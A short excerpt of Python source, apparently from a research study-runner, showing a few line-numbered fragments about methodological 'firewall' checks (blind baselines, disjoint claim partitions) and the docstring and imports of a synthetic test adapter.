85	                "Firewall A: external claims accessed during blind baseline construction"
86	            )
87	        return claims_source

92	    """Firewall B. Disjoint discovery / confirmation id partitions for unit-level claims."""

"""A synthetic, dataset-agnostic reference adapter for exercising the study runner.

This is NOT a dataset — it is a minimal, deterministic double that implements every adapter
Protocol so the engine's composed pipeline can be run end-to-end (both modes) without any real
corpus. It is the runnable demonstration of "the workflow", and the fixture the pipeline tests
and the live integration test drive.
"""

from __future__ import annotations

import datetime as _dt
import hashlib
import json
from pathlib import Path
